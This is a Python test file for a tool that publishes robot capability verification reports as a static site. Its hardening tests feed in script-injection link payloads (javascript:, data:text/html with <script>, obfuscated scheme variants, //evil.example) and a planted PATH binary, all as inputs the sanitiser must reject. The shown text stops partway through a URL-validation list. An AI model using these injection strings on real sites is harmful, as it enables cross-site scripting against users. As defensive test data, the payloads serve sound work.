# SPDX-License-Identifier: Apache-2.0
"""Tests for the `site` reports section, ported from verification-reports-action (va#75).

The restore and composite-action tests stay in the action, which still fetches Pages history.
"""

from __future__ import annotations

import ast
import collections
import contextlib
import hashlib
import json
import os
import re
import shutil
import signal
import subprocess
import tempfile
from html.parser import HTMLParser
from pathlib import Path

import pytest

import site_fixture

from livingproof_capability_report.site import assemble as site_tool


@contextlib.contextmanager
def _time_limit(seconds: int):
    """Fail a slow call, as the action's pytest-timeout marks did, without a new dependency."""

    def expired(signum, frame):
        raise TimeoutError(f"took longer than {seconds} s")

    previous = signal.signal(signal.SIGALRM, expired)
    signal.setitimer(signal.ITIMER_REAL, seconds)
    try:
        yield
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)


REPO = "Living-Proof-Labs/livingproof-unitree-g1"
REPO_ID = 1441484729
ARCHIVE_URL = "https://api.example/7/zip"
BLOB_URL = "https://objects.githubusercontent.example/github-pages/artifact"
SITE_URL = "https://docs.example/livingproof-unitree-g1/"


def _run_url_id(run_id: str) -> str:
    """GitHub run URLs use a numeric id; some tests use a non-numeric folder name."""
    token = run_id.split("-")[0]
    return token if token.isdigit() else "100"


def _make_run_folder(
    parent: Path,
    name: str,
    *,
    repository: str = REPO,
    variant: str = "stock-mujoco-hallway",
    capability: str = "walk-hallway",
    configuration: str = "stock",
    run_id: str = "100",
    created: str = "2026-11-20T06:00:00Z",
    grade: str = "FAIL",
    k: int | None = 12,
    n: int | None = 20,
    required_passes: int | None = 18,
    commit: str = "a" * 40,
    tag: str | None = "v2.3.32",
    spec_tag: str = "v3.1.0",
    spec_revision: str = "0.2.0",
    reporter_tag: str = "v3.15.4",
    finding: str | None = None,
    reproducibility: dict | None = None,
    evaluator_results: list[dict] | None = None,
    integrity_results: dict | None = None,
    evidence_files: dict[str, bytes] | None = None,
    html_override: str | None = None,
    thresholds_bytes: bytes | None = None,
    caller: str | None = None,
) -> Path:
    folder = parent / name
    folder.mkdir(parents=True, exist_ok=True)

    if evaluator_results is None:
        if grade == "UNSUPPORTED":
            results = []
        else:
            ev_doc: dict = {
                "format": "livingproof-evaluator-result/1.1.0",
                "evaluator": {"id": "livingproof-scenario", "display_name": "Scenario"},
                "descriptor": {
                    "title": "Scenario",
                    "purpose": "Evaluates scenario completion.",
                },
            }
            if finding:
                ev_doc["grade"] = "FAIL"
                ev_doc["findings"] = [{"summary": finding}]
            if thresholds_bytes is not None:
                (folder / "thresholds.json").write_bytes(thresholds_bytes)
                ev_doc["inputs"] = [
                    {
                        "role": "thresholds",
                        "uri": "thresholds.json",
                        "sha256": hashlib.sha256(thresholds_bytes).hexdigest(),
                    }
                ]
            results = [{"id": "trial-01", "evaluator_results": [ev_doc]}]
    else:
        results = [{"id": "trial-01", "evaluator_results": evaluator_results}]

    source_bundle: dict = {"results": results}
    if integrity_results is not None:
        source_bundle["assessment"] = {"integrity_results": integrity_results}

    robot_slug = repository.rsplit("/", 1)[-1].removeprefix("livingproof-").lower()
    summary: dict = {
        "capability": capability,
        "spec": {
            "repository": "Living-Proof-Labs/robot-capability-specs",
            "tag": spec_tag,
            "commit": "b" * 40,
            "capability": capability,
            "revision": spec_revision,
        },
        "system": {"id": f"{robot_slug}/{configuration}", "version": "1.1.1"},
        "grade": grade,
        "k": k,
        "n": n,
        "required_passes": required_passes,
    }
    if reproducibility is not None:
        summary["reproducibility"] = reproducibility

    report = {
        "report_version": "1.0.0",
        "source_bundle": source_bundle,
        "summaries": [summary],
    }
    (folder / "report.json").write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")

    evidence_markup = ""
    if evidence_files:
        ev_dir = folder / "evidence"
        ev_dir.mkdir(parents=True, exist_ok=True)
        links_html = []
        for rel_name, payload in evidence_files.items():
            dest = ev_dir / rel_name
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(payload)
            if rel_name.endswith(".mp4"):
                links_html.append(f"<video controls src='evidence/{rel_name}'></video>")
            else:
                links_html.append(f"<p><a href='evidence/{rel_name}'>{rel_name}</a></p>")
        evidence_markup = (
            "<section id='evidence'><p class='is-kept'>Evidence kept for 7 days</p>"
            + "".join(links_html)
            + "</section>"
        )

    if html_override is not None:
        html_text = html_override
    else:
        html_text = (
            "<!doctype html><html lang='en'><head><meta charset='utf-8'>"
            f"<title>{variant}</title></head><body><main>"
            "<section id='summary'><div id='evaluator-livingproof-scenario'>"
            f"<h1>{variant}: {grade}</h1></div></section>"
            f"{evidence_markup}</main></body></html>\n"
        )
    (folder / "report.html").write_text(html_text, encoding="utf-8")
    (folder / "report.md").write_text(f"# {variant}\n\nGrade: {grade}\n", encoding="utf-8")
    (folder / "report.txt").write_text(f"{variant}: {grade}\n", encoding="utf-8")

    commit_info: dict = {
        "sha": commit,
        "url": f"https://github.com/{repository}/commit/{commit}",
    }
    if tag:
        commit_info["tag"] = tag

    run_record = {
        "variant": variant,
        "verification": f"{robot_slug}-{variant}",
        "run": {
            "id": run_id,
            "url": f"https://github.com/{caller or repository}/actions/runs/{_run_url_id(run_id)}",
            "created": created,
        },
        "commit": commit_info,
        "robot": {
            "repository": repository,
            "commit": commit,
            "configuration": configuration,
            "url": (
                f"https://github.com/{repository}/releases/tag/{tag}"
                if tag
                else f"https://github.com/{repository}/tree/{commit}"
            ),
            **({"tag": tag} if tag else {}),
        },
        "poster": {"type": "ci", "name": "CI"},
        "releases": {
            "specs": {
                "repository": "Living-Proof-Labs/robot-capability-specs",
                "tag": spec_tag,
                "commit": "b" * 40,
                "url": f"https://github.com/Living-Proof-Labs/robot-capability-specs/releases/tag/{spec_tag}",
            },
            "verifier": {
                "repository": "Living-Proof-Labs/capability-verifier",
                "tag": "v2.11.4",
                "commit": "c" * 40,
                "url": "https://github.com/Living-Proof-Labs/capability-verifier/releases/tag/v2.11.4",
            },
            "reporter": {
                "repository": "Living-Proof-Labs/livingproof-capability-report",
                "tag": reporter_tag,
                "commit": "d" * 40,
                "url": f"https://github.com/Living-Proof-Labs/livingproof-capability-report/releases/tag/{reporter_tag}",
            },
        },
    }
    (folder / "run.json").write_text(json.dumps(run_record, indent=2) + "\n", encoding="utf-8")

    summed = list(site_tool.REPORT_FILES)
    if (folder / "thresholds.json").is_file():
        summed.append("thresholds.json")
    (folder / "SHA256SUMS").write_text(
        "".join(f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n" for n in summed),
        encoding="utf-8",
    )
    return folder


def _card_aria_labels(index_html: str) -> list[str]:
    return re.findall(r'<a class="card-link"[^>]*aria-label="([^"]+)"', index_html)


# ---------------------------------------------------------------- index & single-robot layout


def test_single_robot_index_orders_failures_first(tmp_path: Path):
    runs_in = tmp_path / "incoming"
    _make_run_folder(
        runs_in,
        "corner-left",
        variant="stock-mujoco-corner-left",
        capability="walk-corner-left",
        grade="PASS",
        k=1,
        n=1,
        required_passes=1,
    )
    _make_run_folder(
        runs_in,
        "unsupported-stairs",
        variant="stock-mujoco-stairs",
        capability="climb-stairs",
        grade="UNSUPPORTED",
        k=None,
        n=None,
        required_passes=None,
    )
    _make_run_folder(
        runs_in,
        "corner-right",
        variant="stock-mujoco-corner-right",
        capability="walk-corner-right",
        grade="INSUFFICIENT_EVIDENCE",
        k=0,
        n=1,
        required_passes=1,
        finding="Recording stopped early.",
    )
    _make_run_folder(
        runs_in,
        "hallway",
        variant="stock-mujoco-hallway",
        capability="walk-hallway",
        grade="FAIL",
        k=12,
        n=20,
        required_passes=18,
        finding="Drifted from the centreline.",
    )

    docs_root = tmp_path / "docs"
    docs_root.mkdir()
    (docs_root / "index.html").write_text(
        "<!doctype html><title>Manual</title>\n", encoding="utf-8"
    )
    reports_dir = docs_root / "reports"

    site_tool.build(reports_dir, runs_in, repository=REPO)
    assert site_fixture.check_reports_tree(reports_dir, repository=REPO) == []

    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    # Single-robot layout: no cross-robot <details class="robot"> accordion.
    assert '<details class="robot"' not in index
    assert 'id="robots"' not in index
    assert '<p class="eyebrow">Unitree G1</p>' in index
    assert "<strong>1 latest result failed.</strong>" in index

    # Failures first, then insufficient evidence, then pass, then unsupported.
    assert _card_aria_labels(index) == [
        "Walk the hallway, latest report (FAIL)",
        "Walk around the corner (right), latest report (Insufficient evidence)",
        "Walk around the corner (left), latest report (PASS)",
        "Climb stairs, latest report (Not supported)",
    ]

    assert "livingproof-verification/" not in index
    assert "Earlier history" not in index


def test_single_robot_constraint_rejects_mixed_robots(tmp_path: Path):
    runs_in = tmp_path / "incoming"
    _make_run_folder(runs_in, "g1", repository="Living-Proof-Labs/livingproof-unitree-g1")
    _make_run_folder(runs_in, "t1", repository="Living-Proof-Labs/livingproof-booster-t1")

    with pytest.raises(site_tool.SiteError, match="one robot per site.*booster-t1, unitree-g1"):
        site_tool.build(tmp_path / "reports", runs_in, repository=REPO)


def test_index_all_pass_and_empty_states(tmp_path: Path):
    empty_html = site_tool._index_page_html({})
    assert '<p class="status">No verification reports published yet.</p>' in empty_html
    assert 'class="all-pass"' not in empty_html
    assert "livingproof-verification/" not in empty_html
    assert "Earlier history" not in empty_html

    runs_in = tmp_path / "incoming"
    _make_run_folder(
        runs_in,
        "hallway",
        variant="stock-mujoco-hallway",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    _make_run_folder(
        runs_in,
        "corner-left",
        variant="stock-mujoco-corner-left",
        capability="walk-corner-left",
        grade="PASS",
        k=1,
        n=1,
        required_passes=1,
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    assert '<p class="all-pass">All 2 latest results pass.</p>' in index
    assert "failed" not in index


# ---------------------------------------------------------------- history, restore & immutability


# ---------------------------------------------------------------- configurable MCAP & video pruning


def test_mcap_and_video_pruned_after_configurable_days_keeping_pages_and_checksums(tmp_path: Path):
    run1 = tmp_path / "r1"
    _make_run_folder(
        run1,
        "hallway",
        run_id="100",
        created="2026-11-01T00:00:00Z",
        grade="FAIL",
        finding="Drifted.",
        evidence_files={
            "trials.mcap": b"mcap recording payload",
            "seed-01-fail.mp4": b"mp4 video payload",
        },
        thresholds_bytes=b'{"max_lateral_drift_m": 0.5}\n',
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, run1, now="2026-11-01T00:00:00Z", days=7, repository=REPO)

    run100 = reports_dir / "unitree-g1/stock-mujoco-hallway/runs/100"
    assert (run100 / "evidence/trials.mcap").is_file()
    assert (run100 / "evidence/seed-01-fail.mp4").is_file()
    assert (run100 / "thresholds.json").is_file()
    assert "Evidence kept for 7 days" in (run100 / "index.html").read_text(encoding="utf-8")
    assert site_fixture.check_reports_tree(reports_dir, repository=REPO) == []
    subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=run100, check=True, capture_output=True)

    # 4 days later with retention=7 days: MCAP and video are still retained.
    run2 = tmp_path / "r2"
    _make_run_folder(
        run2,
        "hallway",
        run_id="200",
        created="2026-11-05T00:00:00Z",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    site_tool.build(reports_dir, run2, now="2026-11-05T00:00:00Z", days=7, repository=REPO)
    assert (run100 / "evidence/trials.mcap").is_file()
    assert (run100 / "evidence/seed-01-fail.mp4").is_file()

    # With configurable retention=3 days at 2026-11-05 (4 days old): MCAP and video are pruned!
    run3 = tmp_path / "r3"
    _make_run_folder(
        run3,
        "hallway",
        run_id="300",
        created="2026-11-05T12:00:00Z",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    site_tool.build(reports_dir, run3, now="2026-11-05T12:00:00Z", days=3, repository=REPO)

    assert not (run100 / "evidence/trials.mcap").exists()
    assert not (run100 / "evidence/seed-01-fail.mp4").exists()

    # Report pages, thresholds.json, run.json, and SHA256SUMS remain and verify cleanly.
    for kept in (
        "index.html",
        "report.html",
        "report.json",
        "report.md",
        "report.txt",
        "run.json",
        "thresholds.json",
        "SHA256SUMS",
    ):
        assert (run100 / kept).is_file(), kept

    pruned_page = (run100 / "index.html").read_text(encoding="utf-8")
    assert "Evidence expired after 3 days" in pruned_page
    assert "Evidence kept for" not in pruned_page
    assert "trials.mcap" in pruned_page  # label text remains without broken link
    assert "href='evidence/" not in pruned_page and 'href="evidence/' not in pruned_page
    assert site_fixture.check_reports_tree(reports_dir, repository=REPO) == []
    subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=run100, check=True, capture_output=True)


# ---------------------------------------------------------------- chips, integrity & scrubbing


def test_evidence_manifest_controller_artifact_is_published(tmp_path: Path):
    manifest = {
        "format": "livingproof-evidence-manifest/1.0.0",
        "configuration": {
            "profile": {
                "controller": {
                    "publisher": "Unitree Robotics",
                    "artifact": {
                        "repo": "https://github.com/unitreerobotics/unitree_rl_gym",
                        "path": "deploy/pre_train/g1/motion.pt",
                        "commit": "a" * 40,
                        "sha256": "b" * 64,
                        "license": "BSD-3-Clause",
                    },
                }
            }
        },
    }
    payload = (json.dumps(manifest, indent=2) + "\n").encode()
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in", repository=REPO)
    published = json.loads(
        next(reports.rglob("evidence/manifest.json")).read_text(encoding="utf-8")
    )
    stored = published["configuration"]["profile"]["controller"]["artifact"]
    assert stored["path"] == "deploy/pre_train/g1/motion.pt"
    assert site_tool.public_page_problems(reports, repository=REPO) == []


def _manifest_with_controller_artifact(artifact: dict, **extra: object) -> bytes:
    document = {
        "format": "livingproof-evidence-manifest/1.0.0",
        "configuration": {"profile": {"controller": {"artifact": artifact}}},
    }
    document.update(extra)
    return (json.dumps(document) + "\n").encode()


def test_other_manifest_artifact_key_is_refused(tmp_path: Path):
    payload = _manifest_with_controller_artifact(
        {"path": "deploy/pre_train/g1/motion.pt"},
        notes={"artifact": {"name": "motion.pt"}},
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)


def test_artifact_wording_inside_controller_artifact_values_is_refused(tmp_path: Path):
    payload = _manifest_with_controller_artifact(
        {"path": "deploy/pre_train/g1/motion.pt", "note": "shipped artifact"}
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)


def test_duplicate_controller_artifact_key_is_refused(tmp_path: Path):
    payload = (
        b'{"configuration":{"profile":{"controller":'
        b'{"artifact":"leaked artifact wording","artifact":{"path":"m"}}}}}\n'
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)


def test_artifact_wording_in_rendered_page_text_is_refused(tmp_path: Path):
    reports = tmp_path / "reports"
    reports.mkdir()
    page = reports / "index.html"
    page.write_text("<p>Download the artifact.</p>", encoding="utf-8")
    assert site_tool.public_page_problems(reports, repository=REPO) == [
        "index.html mentions an artifact"
    ]
    assert site_tool.html_is_dirty(page.read_text(encoding="utf-8"))
    page.write_text(
        "<p><a href='https://github.com/org/repo/actions/runs/1/job/9'>job</a></p>",
        encoding="utf-8",
    )
    assert site_tool.public_page_problems(reports, repository=REPO) == [
        "index.html links to /actions/"
    ]


def test_actions_urls_and_artifact_wording_are_scrubbed_from_public_files(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(
        runs_in,
        "hallway",
        html_override=(
            "<!doctype html><html><body><main>"
            "<p>See <a href='https://github.com/org/repo/actions/runs/7/artifacts/101'>"
            "MCAP artifact</a> "
            "and https://github.com/org/repo/actions/runs/7</p>"
            "</main></body></html>\n"
        ),
    )
    rep = json.loads((folder / "report.json").read_text(encoding="utf-8"))
    rep["evidence_links"] = {
        "run": "https://github.com/org/repo/actions/runs/7",
        "links": [
            {
                "label": "MCAP",
                "kind": "mcap",
                "url": "https://github.com/org/repo/actions/runs/7/artifacts/101",
            },
            {"label": "External note", "kind": "note", "url": "https://example.com/note"},
        ],
    }
    (folder / "report.json").write_text(json.dumps(rep), encoding="utf-8")
    (folder / "report.md").write_text(
        "Artifact at https://github.com/org/repo/actions/runs/7\n", encoding="utf-8"
    )
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    assert site_tool.public_page_problems(reports_dir, repository=REPO) == []
    assert site_fixture.check_reports_tree(reports_dir, repository=REPO) == []


def test_inconclusive_integrity_and_spec_changed_chips_and_compared_runs(tmp_path: Path):
    inconclusive_doc = {
        "format": "livingproof-evaluator-result/1.2.0",
        "evaluator": {"id": "livingproof-run-integrity", "display_name": "Run Integrity"},
        "descriptor": {"title": "Run Integrity", "purpose": "Checks recording integrity."},
        "integrity": {"run": {"test_system_status": "INCONCLUSIVE"}},
    }
    r1 = tmp_path / "r1"
    _make_run_folder(
        r1,
        "hallway",
        run_id="100",
        created="2026-11-20T00:00:00Z",
        grade="PASS",
        k=None,
        n=None,
        required_passes=None,
        spec_tag="v3.0.0",
        reproducibility={"compared": True, "statement": "3 of 3 repeats agree"},
        integrity_results={"livingproof-run-integrity": inconclusive_doc},
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, r1, repository=REPO)

    r2 = tmp_path / "r2"
    _make_run_folder(
        r2,
        "hallway",
        run_id="200",
        created="2026-11-21T00:00:00Z",
        grade="FAIL",
        spec_tag="v3.1.0",
        finding="Drifted.",
    )
    site_tool.build(reports_dir, r2, repository=REPO)

    history = (reports_dir / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    assert "Spec changed: v3.0.0 → v3.1.0" in history
    assert "Run Integrity not graded" in history
    assert "None/None" not in history
    assert 'href="runs/200/#evaluator-livingproof-scenario"' in history


def test_tampered_checksums_and_invalid_reports_fail_closed(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(runs_in, "hallway")
    (folder / "report.txt").write_text("tampered\n", encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="SHA256SUMS"):
        site_tool.build(tmp_path / "reports", runs_in, repository=REPO)


# ---------------------------------------------------------------- client timezone script


@pytest.mark.skipif(
    shutil.which("node") is None,
    reason="needs Node.js; the Docker development image has none, Verify's reporter tests run it",
)
def test_open_js_formats_viewer_timezone_without_relative_age(tmp_path: Path):
    runs_in = tmp_path / "in"
    _make_run_folder(runs_in, "hallway", created="2026-11-18T05:20:00Z")
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)

    index_html = (reports_dir / "index.html").read_text(encoding="utf-8")
    open_js = (reports_dir / "open.js").read_text(encoding="utf-8")

    class TimeExtractor(HTMLParser):
        def __init__(self):
            super().__init__()
            self.times: list[dict] = []
            self._cur: dict | None = None

        def handle_starttag(self, tag, attrs):
            amap = dict(attrs)
            if tag == "time" and "datetime" in amap:
                self._cur = {
                    "datetime": amap["datetime"],
                    "title": amap.get("title", ""),
                    "text": "",
                }
                self.times.append(self._cur)

        def handle_endtag(self, tag):
            if tag == "time":
                self._cur = None

        def handle_data(self, data):
            if self._cur is not None:
                self._cur["text"] += data

    ext = TimeExtractor()
    ext.feed(index_html)
    assert ext.times and ext.times[0]["text"] == "18 Nov 2026, 05:20 UTC"

    driver = r"""
const fs = require("fs");
const vm = require("vm");
const payload = JSON.parse(fs.readFileSync(0, "utf8"));
const els = payload.times.map((t) => {
  const attrs = new Map([["datetime", t.datetime], ["title", t.title]]);
  return {
    textContent: t.text,
    getAttribute: (k) => (attrs.has(k) ? attrs.get(k) : null),
    setAttribute: (k, v) => attrs.set(k, String(v)),
  };
});
const ctx = {
  Date,
  Number,
  String,
  Math,
  Intl: {
    DateTimeFormat: function (loc, opts) {
      return new Intl.DateTimeFormat(loc || payload.locale, { ...opts, timeZone: payload.tz });
    },
  },
  document: {
    readyState: "complete",
    fonts: null,
    addEventListener: () => {},
    querySelectorAll: (sel) => (sel === "time[datetime]" ? els : []),
  },
  window: { addEventListener: () => {} },
};
vm.runInNewContext(payload.script, ctx);
process.stdout.write(JSON.stringify(els.map((e) => e.textContent)));
"""
    for tz, locale, expected in [
        ("Australia/Sydney", "en-AU", "18 Nov 2026, 16:20 AEDT"),
        ("America/Los_Angeles", "en-US", "17 Nov 2026, 21:20 PST"),
        ("Asia/Kolkata", "en-US", "18 Nov 2026, 10:50 GMT+5:30"),
    ]:
        proc = subprocess.run(
            ["node", "-e", driver],
            input=json.dumps({"script": open_js, "times": ext.times, "tz": tz, "locale": locale}),
            check=True,
            capture_output=True,
            text=True,
            env={**os.environ, "TZ": tz},
        )
        rendered = json.loads(proc.stdout)
        assert rendered[0] == expected


# ---------------------------------------------------------------- site_action PR vs main behavior


def test_multi_configuration_definition_folders_do_not_collide(tmp_path: Path):
    runs_in = tmp_path / "verification-report"
    for config, grade in (("stock", "PASS"), ("modified", "FAIL")):
        folder = runs_in / "walk-hallway" / config
        folder.mkdir(parents=True)
        report = {
            "report_version": "1.0.0",
            "summaries": [
                {
                    "capability": "walk-hallway",
                    "system": {"id": f"unitree-g1/{config}", "version": "1.0.0"},
                    "grade": grade,
                    "k": 1 if grade == "PASS" else 0,
                    "n": 1,
                    "required_passes": 1,
                }
            ],
        }
        (folder / "report.json").write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
        (folder / "report.html").write_text(
            f"<!doctype html><html><body><p>{config}: {grade}</p></body></html>\n",
            encoding="utf-8",
        )
        (folder / "report.md").write_text(f"# {config}: {grade}\n", encoding="utf-8")
        (folder / "report.txt").write_text(f"{config}: {grade}\n", encoding="utf-8")
        run_record = {
            "variant": "walk-hallway",
            "verification": "walk-hallway",
            "run": {
                "id": "42",
                "url": f"https://github.com/{REPO}/actions/runs/42",
                "created": "2026-11-23T04:00:00Z",
            },
            "commit": {"sha": "a" * 40, "url": f"https://github.com/{REPO}/commit/{'a' * 40}"},
            "robot": {
                "repository": REPO,
                "commit": "a" * 40,
                "configuration": config,
                "url": f"https://github.com/{REPO}/tree/{'a' * 40}",
            },
        }
        (folder / "run.json").write_text(json.dumps(run_record, indent=2) + "\n", encoding="utf-8")
        (folder / "SHA256SUMS").write_text(
            "".join(
                f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
                for n in site_tool.REPORT_FILES
            ),
            encoding="utf-8",
        )

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    assert site_fixture.check_reports_tree(reports_dir, repository=REPO) == []
    assert (reports_dir / "unitree-g1/walk-hallway-modified/runs/42/run.json").is_file()
    assert (reports_dir / "unitree-g1/walk-hallway-stock/runs/42/run.json").is_file()
    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    assert index.index("walk-hallway-modified/latest/") < index.index("walk-hallway-stock/latest/")


# ---------------------------------------------------------------- takeover hardening (Rivet)


@pytest.mark.parametrize(
    "parts",
    [("Unitree G1", "stock", "1"), ("unitree-g1", "Stock", "1"), ("unitree-g1", "stock", "-1")],
)
def test_restored_run_paths_must_be_safe_segments(tmp_path: Path, parts: tuple[str, str, str]):
    reports = tmp_path / "reports"
    robot, variant, run_id = parts
    run = reports / robot / variant / "runs" / run_id
    run.mkdir(parents=True)
    (run / "run.json").write_text(json.dumps({"run": {"created": "2026-11-20T00:00:00Z"}}))
    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(reports)


def test_restored_symlinked_run_folder_is_refused(tmp_path: Path):
    real = tmp_path / "elsewhere"
    real.mkdir()
    (real / "run.json").write_text(json.dumps({"run": {"created": "2026-11-20T00:00:00Z"}}))
    runs_dir = tmp_path / "reports/unitree-g1/stock/runs"
    runs_dir.mkdir(parents=True)
    (runs_dir / "100").symlink_to(real, target_is_directory=True)
    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(tmp_path / "reports")


def test_build_never_runs_a_reporter_binary_found_on_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    marker = tmp_path / "ran"
    fake = bin_dir / "livingproof-capability-report"
    fake.write_text(f"#!/bin/sh\ntouch {marker}\nexit 1\n")
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}")
    runs_in = tmp_path / "runs"
    site_fixture.write(runs_in, run_id="77", created="2026-11-23T03:00:00Z")
    site_tool.build(tmp_path / "reports", runs_in, repository=REPO)
    assert not marker.exists()
    assert site_fixture.check_reports_tree(tmp_path / "reports", repository=REPO) == []


def test_forged_run_json_hrefs_allow_only_https_and_relative_links(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(runs_in, "hallway", run_id="404", tag=None)
    record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
    record["commit"]["url"] = "javascript:alert(4)"
    record["robot"]["url"] = "  JaVaScRiPt:alert(5)"
    record["releases"]["verifier"]["url"] = "data:text/html,<script>alert(6)</script>"
    record["releases"]["reporter"]["url"] = "http://insecure.example/tag"
    record["releases"]["specs"]["url"] = "java\tscript:alert(7)"
    record["releases"]["extra"] = {
        "tag": "v1.0.0",
        "url": "https://github.com/Living-Proof-Labs/example/releases/tag/v1.0.0",
    }
    (folder / "run.json").write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)

    history_html = (reports_dir / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    index_html = (reports_dir / "index.html").read_text(encoding="utf-8")
    styles_css = (reports_dir / "styles.css").read_text(encoding="utf-8")

    for text in (history_html, index_html):
        assert "javascript:" not in text.lower()
        assert "data:" not in text.lower()
        assert 'href="http://' not in text.lower()
        assert "fonts.googleapis.com" not in text
        assert "fonts.gstatic.com" not in text

    assert "https://github.com/Living-Proof-Labs/example/releases/tag/v1.0.0" in history_html
    assert 'href="latest/"' in history_html
    assert "DM Sans" not in styles_css


# ---------------------------------------------------------------- va#14 takeover checks (Rivet)

ROOT = Path(__file__).resolve().parents[1]
SITE_PACKAGE = ROOT / "src/livingproof_capability_report/site"
REPORT_MODULES = ("assemble", "pages", "common", "check", "details")


def _top_level_names(path: Path) -> set[str]:
    names: set[str] = set()
    for node in ast.parse(path.read_text(encoding="utf-8")).body:
        if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
            names.add(node.name)
        elif isinstance(node, ast.Assign):
            names.update(t.id for t in node.targets if isinstance(t, ast.Name))
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
            names.add(node.target.id)
    return names


def test_split_modules_define_each_top_level_name_once():
    # The split was cut by line ranges; a second, drifted copy of a helper (as with
    # _require_single_robot, _stamp, SITE_PATH) must not come back.
    seen: dict[str, str] = {}
    for module in REPORT_MODULES:
        for name in _top_level_names(SITE_PACKAGE / f"{module}.py") - {"__all__"}:
            assert name not in seen, f"{name} is defined in both {seen[name]} and {module}"
            seen[name] = module


def test_generated_site_matches_the_golden_bytes():
    # The golden file is verification-reports-action's tests/fixtures/site-golden/SHA256SUMS
    # at v3.10.x, copied unchanged: the moved renderer must publish the same bytes.
    expected = (ROOT / "tests/fixtures/site-golden/SHA256SUMS").read_text(encoding="utf-8")
    with tempfile.TemporaryDirectory() as tmp:
        actual = site_fixture.digests(site_fixture.build_golden_site(Path(tmp)))
    assert actual == expected


def test_theme_switch_markup_matches_the_packaged_styles(tmp_path: Path):
    runs_in = tmp_path / "in"
    site_fixture.write(runs_in, run_id="1", created="2026-11-20T06:00:00Z")
    site_tool.build(tmp_path / "reports", runs_in, repository=REPO)
    index_html = (tmp_path / "reports/index.html").read_text(encoding="utf-8")
    css = (tmp_path / "reports/styles.css").read_text(encoding="utf-8")
    assert '<fieldset class="theme">' in index_html
    for selector in (".theme label", "#theme-light:checked", "#theme-dark:checked"):
        assert selector in css
    for element_id in ("theme-system", "theme-light", "theme-dark"):
        assert f'id="{element_id}"' in index_html
    assert "DM Sans" not in css and "fonts.g" not in index_html


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("https://github.com/x/y", "https://github.com/x/y"),
        (
            "https://docs.livingprooflabs.com/reading-reports.html",
            "https://docs.livingprooflabs.com/reading-reports.html",
        ),
        (
            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
        ),
        # The reporter never links to an IP literal, so none is allowed.
        ("https://[2001:db8::1]/x", None),
        ("https://[::1]/", None),
        ("https://@example.com/", None),
        (
            "https://docs.livingprooflabs.com:8443/path",
            "https://docs.livingprooflabs.com:8443/path",
        ),
        ("../runs/1/", "../runs/1/"),
        ("#summary", "#summary"),
        ("javascript:alert(1)", None),
        ("  JAVASCRIPT:alert(1)", None),
        ("java\nscript:alert(1)", None),
        ("vbscript:x", None),
        ("data:text/html,x", None),
        ("http://example.com/", None),
        ("//evil.example/x", None),
        ("https:evil", None),
        ("https://[::1", None),
        ("https://user:pass@example.com/", None),
        ("https://user@example.com/", None),
        ("https://exa mple.com/", None),
        ("https://exa\tmple.com/", None),
        ("https://-bad.example/", None),
        ("https://example.com:99999/", None),
        ("a\\b", None),
        ("", None),
